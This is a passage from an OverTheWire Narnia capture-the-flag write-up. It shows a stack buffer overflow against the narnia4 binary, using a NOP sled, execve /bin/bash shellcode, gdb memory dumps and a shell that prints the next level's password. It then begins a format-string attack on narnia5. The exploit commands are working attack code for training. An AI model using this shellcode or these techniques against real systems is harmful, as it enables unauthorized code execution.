class="c8">5152</span><span class="c3">e389 &nbsp; &nbsp; &nbsp;0xcde</span><span class="c8">1895</span><span class="c3">3 &nbsp; &nbsp; &nbsp;0x</span><span class="c8">00000080</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>We can see that the NOP sled starts at </span><span class="c3">0xffffcec0</span><span>, and the shellcode starts at </span><span class="c3">0xffffcf24</span><span>. So the eip register can point to any address within the boundaries of these two address (the address of </span><span class="c3">0xffffcf08</span><span class="c2">&nbsp;was arbitrarily chosen; any address within the nop sled would work):</span></p><a id="t.6c703169554b8ae46d837c7afe627eeac24049ab"></a><a id="t.47"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; r $(python -c &quot;print &#39;A&#39;*264+&#39;</span><span class="c11">\x</span><span class="c3">08</span><span class="c11">\x</span><span class="c3">cf</span><span class="c11">\x</span><span class="c3">ff</span><span class="c11">\x</span><span class="c3">ff&#39;*4+&#39;</span><span class="c11">\x</span><span class="c3">90&#39;*100+&#39;</span><span class="c11">\x</span><span class="c3">6a</span><span class="c11">\x</span><span class="c3">0b</span><span class="c11">\x</span><span class="c3">58</span><span class="c11">\x</span><span class="c3">99</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">66</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2d</span><span class="c11">\x</span><span class="c3">70</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e1</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">6a</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2f</span><span class="c11">\x</span><span class="c3">62</span><span class="c11">\x</span><span class="c3">61</span><span class="c11">\x</span><span class="c3">73</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2f</span><span class="c11">\x</span><span class="c3">62</span><span class="c11">\x</span><span class="c3">69</span><span class="c11">\x</span><span class="c3">6e</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e<br>3</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">51</span><span class="c11">\x</span><span class="c3">53</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e1</span><span class="c11">\x</span><span class="c3">cd</span><span class="c11">\x</span><span class="c3">80&#39;&quot;) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: /home/0xd4y/business/other/overthewire/narnia/4/narnia4 $(python -c &quot;print &#39;A&#39;*264+&#39;</span><span class="c11">\x</span><span class="c3">08</span><span class="c11">\x</span><span class="c3">cf</span><span class="c11">\x</span><span class="c3">ff</span><span class="c11">\x</span><span class="c3">ff&#39;*4+&#39;</span><span class="c11">\x</span><span class="c3">90&#39;*100+&#39;</span><span class="c11">\x</span><span class="c3">6a</span><span class="c11">\x</span><span class="c3">0b</span><span class="c11">\x</span><span class="c3">58</span><span class="c11">\x</span><span class="c3">99</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">66</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2d</span><span class="c11">\x</span><span class="c3">70</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e1</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">6a</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2f</span><span class="c11">\x</span><span class="c3">62</span><span class="c11">\x</span><span class="c3">61</span><span class="c11">\x</span><span class="c3">73</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2f</span><span class="c11">\x</span><span class="c3">62</span><span class="c11">\x</span><span class="c3">69</span><span class="c11">\x</span><span class="c3">6e</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e3</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">51</span><span class="c11">\x</span><span class="c3">53</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e1</span><span class="c11">\x</span><span class="c3">cd</span><span class="c11">\x</span><span class="c3">80&#39;&quot;) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 169.33px;"><img alt="" src="images/image11.png" style="width: 624.00px; height: 169.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">Expectedly, using this same methodology on the target machine results in successful exploitation:</span></p><a id="t.247de8afe4918dbbd84ba80754fbb44ca76cacdb"></a><a id="t.48"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">(gdb) r $(python -c </span><span class="c11">&quot;print &#39;A&#39;*264 +&#39;B&#39;*4+&#39;\x90&#39;*100+&#39;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x8</span><span class="c3"><br></span><span class="c8">9</span><span class="c3">\xe1\xcd\x80&#39;&quot;) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: /narnia/narnia4 $(python -c &quot;print &#39;A&#39;*264 +&#39;B&#39;*4+&#39;\x90&#39;*100+&#39;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\<br>x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#39;&quot;) <br><br>Program received signal SIGSEGV, Segmentation fault.<br>0x</span><span class="c8">42424242</span><span class="c3">&nbsp;in ?? ()<br>(gdb) x/100x $esp-200<br>0xffffd378: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd388: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd398: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd3a8: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd3b8: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd3c8: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd3d8: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd3e8: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd3f8: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd408: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd418: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd428: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3"><br>0xffffd438: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">42424242</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3"><br>0xffffd448: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3"><br>0xffffd458: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3"><br>0xffffd468: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3"><br>0xffffd478: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3"><br>0xffffd488: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3"><br>0xffffd498: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">9958</span><span class="c3">0b6a<br>0xffffd4a8: &nbsp; &nbsp; 0x2d</span><span class="c8">686652</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x52e</span><span class="c8">1897</span><span class="c3">0 &nbsp; &nbsp; &nbsp;0x2f</span><span class="c8">6868</span><span class="c3">6a &nbsp; &nbsp; &nbsp;0x</span><span class="c8">68736162</span><span class="c3"><br>0xffffd4b8: &nbsp; &nbsp; 0x6e</span><span class="c8">6962</span><span class="c3">2f &nbsp; &nbsp; &nbsp;0x</span><span class="c8">5152</span><span class="c3">e389 &nbsp; &nbsp; &nbsp;0xcde</span><span class="c8">1895</span><span class="c3">3 &nbsp; &nbsp; &nbsp;0xf7fe</span><span class="c8">0080</span><span class="c3"><br>0xffffd4c8: &nbsp; &nbsp; 0xffffd4cc &nbsp; &nbsp; &nbsp;0xf7ffd920 &nbsp; &nbsp; &nbsp;0x</span><span class="c8">00000002</span><span class="c3">&nbsp; &nbsp; &nbsp; 0xffffd626</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Seeing as the NOP sled begins at </span><span class="c3">0xffffd440</span><span>, and the shellcode begins at </span><span class="c3">0xffffd4a4</span><span class="c2">, any address within the bounds of these two addresses will result in the execution of the shellcode. Using the same payload as the one on the attack box with the modification of the address surprisingly results in a &ldquo;Segmentation fault&rdquo;.</span></p><a id="t.84bc7905d941ae3a8eb20311b7bc76b23db20ad5"></a><a id="t.49"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia4@narnia:/narnia$ ./narnia4 $(python -c &quot;print &#39;A&#39;*264+&#39;</span><span class="c11">\x</span><span class="c3">58</span><span class="c11">\x</span><span class="c3">d4</span><span class="c11">\x</span><span class="c3">ff</span><span class="c11">\x</span><span class="c3">ff&#39;*4+&#39;</span><span class="c11">\x</span><span class="c3">9<br>0&#39;*100+&#39;</span><span class="c11">\x</span><span class="c3">6a</span><span class="c11">\x</span><span class="c3">0b</span><span class="c11">\x</span><span class="c3">58</span><span class="c11">\x</span><span class="c3">99</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">66</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2d</span><span class="c11">\x</span><span class="c3">70</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e1</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">6a</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2f</span><span class="c11">\x</span><span class="c3">62</span><span class="c11">\x</span><span class="c3">61</span><span class="c11">\x</span><span class="c3">73</span><span class="c11">\x</span><span class="c3"><br>68</span><span class="c11">\x</span><span class="c3">2f</span><span class="c11">\x</span><span class="c3">62</span><span class="c11">\x</span><span class="c3">69</span><span class="c11">\x</span><span class="c3">6e</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e3</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">51</span><span class="c11">\x</span><span class="c3">53</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e1</span><span class="c11">\x</span><span class="c3">cd</span><span class="c11">\x</span><span class="c3">80&#39;&quot;)<br>Segmentation fault</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">This was the same problem that occurred in Narnia 2. Just as we did in Narnia 2, tweaking the return address by slightly incrementing it results in the successful execution of the shellcode:</span></p><a id="t.dada7830318021a592cc12025df91d0ed5346c8c"></a><a id="t.50"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia4@narnia:/narnia$ ./narnia4 $(python -c </span><span class="c11">&quot;print &#39;A&#39;*264 &nbsp;+&#39;\x90\xd4\xff\xff&#39;*4+&#39;\x90&#39;*100+&#39;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\<br>x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#39;&quot;</span><span class="c3">)<br>bash-4.4$ whoami<br>narnia5<br>bash-4.4$ cat /etc/narnia_pass/narnia5<br>faimahchiy</span></p></td></tr></table><h3 class="c10" id="h.q1ltbnf2eoc8"><span class="c5">Source Code</span></h3><a id="t.a45889b22a9d0d0a2998d938c8f17d68abd93ec8"></a><a id="t.51"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;string.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;ctype.h&gt;</span><span class="c3"><br><br></span><span class="c6">extern</span><span class="c3">&nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;**environ;<br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">(</span><span class="c6">int</span><span class="c8">&nbsp;argc,</span><span class="c6">char</span><span class="c8">&nbsp;**argv)</span><span class="c3">{<br> &nbsp; &nbsp;</span><span class="c6">int</span><span class="c3">&nbsp;i;<br> &nbsp; &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;buffer[</span><span class="c8">256</span><span class="c3">];<br><br> &nbsp; &nbsp;</span><span class="c6">for</span><span class="c3">(i = </span><span class="c8">0</span><span class="c3">; environ[i] != </span><span class="c8">NULL</span><span class="c3">; i++)<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">memset</span><span class="c3">(environ[i], </span><span class="c11">&#39;\0&#39;</span><span class="c3">, </span><span class="c8">strlen</span><span class="c3">(environ[i]));<br><br> &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(argc&gt;</span><span class="c8">1</span><span class="c3">)<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">strcpy</span><span class="c3">(buffer,argv[</span><span class="c8">1</span><span class="c3">]);<br><br> &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>The source code does not agree with what we saw in Ghidra. This is because Ghidra is converting the assembly instructions into c code, and for loops look similar to while loops. We can see from the source code that the program is setting 256 bytes to a buffer, and it is not performing any sort of boundary checks</span><sup><a href="#ftnt10" id="ftnt_ref10">[10]</a></sup><span class="c2">&nbsp;(a detection of the size of the input before it is used).</span></p><h2 class="c10" id="h.n6g8yeh9n8qz"><span class="c40 c36">Narnia 5</span></h2><p class="c0"><span class="c2">After exploiting the narnia4 binary, we now have the necessary permissions to execute the narnia5 binary,.</span></p><h3 class="c10" id="h.p5cduqaaxxju"><span class="c5">Binary Analysis</span></h3><p class="c0"><span class="c2">We can start by executing the narnia5 binary to see how it normally behaves:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 88.00px;"><img alt="" src="images/image3.png" style="width: 624.00px; height: 88.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>We can see from the output that we are meant to change the value for the local variable called </span><span class="c27">i</span><span>. Furthermore, entering an input such as </span><span class="c27">AAAA</span><span class="c2">&nbsp;into the binary, we can see that the input gets reflected.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 88.00px;"><img alt="" src="images/image5.png" style="width: 624.00px; height: 88.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">After fiddling around with the input, we can find that the buffer accepts a total of 63 bytes. We can analyze this binary further with Ghidra. </span></p><a id="t.59585d49b1a0ba51945faa58d8fdb3976c2e5bce"></a><a id="t.52"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">undefined4 main(undefined4 param_1,int param_2)<br><br>{<br> &nbsp;__uid_t __euid</span><span class="c39">;</span><span class="c3"><br> &nbsp;__uid_t __ruid</span><span class="c39">;</span><span class="c3"><br> &nbsp;size_t sVar1</span><span class="c39">;</span><span class="c3"><br> &nbsp;char local_4c [</span><span class="c8">63</span><span class="c3">]</span><span class="c39">;</span><span class="c3"><br> &nbsp;undefined local_d</span><span class="c39">;</span><span class="c3"><br> &nbsp;int local_c</span><span class="c39">;</span><span class="c3"><br> &nbsp;<br> &nbsp;local_c = </span><span class="c8">1</span><span class="c39">;</span><span class="c3"><br> &nbsp;snprintf(local_4c,</span><span class="c8">0x40</span><span class="c3">,*(char **)(param_2 + </span><span class="c8">4</span><span class="c3">))</span><span class="c39">;</span><span class="c3"><br> &nbsp;local_d = </span><span class="c8">0</span><span class="c39">;</span><span class="c3"><br> &nbsp;printf(</span><span class="c11">&quot;Change i\&#39;s value from 1 -&gt; 500. &quot;</span><span class="c3">)</span><span class="c39">;</span><span class="c3"><br> &nbsp;if (local_c == </span><span class="c8">500</span><span class="c3">) {<br> &nbsp; &nbsp;puts(</span><span class="c11">&quot;GOOD&quot;</span><span class="c3">)</span><span class="c39">;</span><span class="c3"><br> &nbsp; &nbsp;__euid = geteuid()</span><span class="c39">;</span><span class="c3"><br> &nbsp; &nbsp;__ruid = geteuid()</span><span class="c39">;</span><span class="c3"><br> &nbsp; &nbsp;setreuid(__ruid,__euid)</span><span class="c39">;</span><span class="c3"><br> &nbsp; &nbsp;system(</span><span class="c11">&quot;/bin/sh&quot;</span><span class="c3">)</span><span class="c39">;</span><span class="c3"><br> &nbsp;}<br> &nbsp;puts(</span><span class="c11">&quot;No way...let me give you a hint!&quot;</span><span class="c3">)</span><span class="c39">;</span><span class="c3"><br> &nbsp;sVar1 = strlen(local_4c)</span><span class="c39">;</span><span class="c3"><br> &nbsp;printf(</span><span class="c11">&quot;buffer : [%s] (%d)\n&quot;</span><span class="c3">,local_4c,sVar1)</span><span class="c39">;</span><span class="c3"><br> &nbsp;printf(</span><span class="c11">&quot;i = %d (%p)\n&quot;</span><span class="c3">,local_c,&amp;local_c)</span><span class="c39">;</span><span class="c3"><br> &nbsp;return </span><span class="c8">0</span><span class="c39">;</span><span class="c3"><br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>There is a local_c variable being set to 1 (this is the i) and stays unchanged. We can see that there is an if statement, and within it </span><span class="c27">/bin/sh</span><span>&nbsp;gets executed as the narnia6 user. However, due to the local_c variable staying unchanged, the if statement is never run. From the code, we can deduce that there is a vulnerability in the following line: </span><span class="c3">snprintf(local_4c,</span><span class="c8">0x40</span><span class="c3">,*(char **)(param_2 + </span><span class="c8">4</span><span class="c3">))</span><span class="c39">;</span><span class="c2">. This may be surprising, as the manual page for snprintf encourages its usage:</span></p><a id="t.deefda950065e34de21bbc4ffa3b4e67f4e77959"></a><a id="t.53"></a><table class="c24"><tr class="c22"><td class="c71" colspan="1" rowspan="1"><p class="c19"><span class="c60 c49">BUGS<br> &nbsp; &nbsp; &nbsp; Because sprintf() and vsprintf() assume an arbitrarily long string, callers must be careful not to overflow the</span><span>&nbsp;</span><span class="c45 c49 c86">actual space; this is often impossible to assure. Note that the length of the strings produced is locale-de&#8208;pendent and difficult to predict. &nbsp;Use snprintf() and vsnprintf() instead (or asprintf(3) and vasprintf(3)).</span></p><p class="c0 c29"><span class="c45 c86 c49"></span></p><p class="c0"><span class="c86 c49">&nbsp; &nbsp; &nbsp; &nbsp;Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from un&#8208;trusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.</span></p></td></tr></table><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span>The security hole within this function lies in the fact that it uses a buffer of a fixed length with no boundary checks</span><sup><a href="#ftnt11" id="ftnt_ref11">[11]</a></sup><span class="c2">. </span></p><a id="t.ea01dffad08a2dc31ef81600ba75b434e404d629"></a><a id="t.54"></a><table class="c24"><tr class="c22"><td class="c71" colspan="1" rowspan="1"><p class="c19"><span class="c49 c60">(snprintf) is safe as you long as you provide the correct length for the buffer. snprintf does guarantee that the buffer won&#39;t be overwritten, but it does not guarantee null-termination.</span></p></td></tr></table><h3 class="c10" id="h.or0vns1b426t"><span class="c5">Format String Exploit</span></h3><p class="c0"><span class="c2">Therefore, upon providing a format character such as %x, the function will spit out addresses from the stack.</span></p><h4 class="c21" id="h.1d69hbczxii5"><span class="c16">POC</span></h4><a id="t.0ad2d04f2da436e40581b53bcbed587016cdab46"></a><a id="t.55"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia5</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia5 %x<br>Change i</span><span class="c11">&#39;s value from 1 -&gt; 500. No way...let me give you a hint!<br>buffer : [f7fc5000] (8)<br>i = 1 (0xffffd5f0)</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Despite only providing %x as the input, we can see the buffer contains 8 bytes. The methodology behind a format string attack is finding the address of a local variable that we would like to overwrite (this is given to us as </span><span class="c11">0xffffd5f0</span><span class="c2">). After discovering the address of the targeted variable, we need to determine where the input gets stored in memory. After finding this information, we can finally overwrite the variable by providing its address followed by the %n format specifier.</span></p><p class="c0"><span>Providing the input string of </span><span class="c27">AAAA </span><span>followed by the </span><span class="c27">%x</span><span class="c2">&nbsp;format specifier, we can immediately see the position of the input in the stack:</span></p><a id="t.a21c43ad0bb10cdac28726666ef1e620da3b236c"></a><a id="t.56"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia5</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia5 AAAA%x<br>Change i</span><span class="c11">&#39;s value from 1 -&gt; 500. No way...let me give you a hint!<br>buffer : [AAAA41414141] 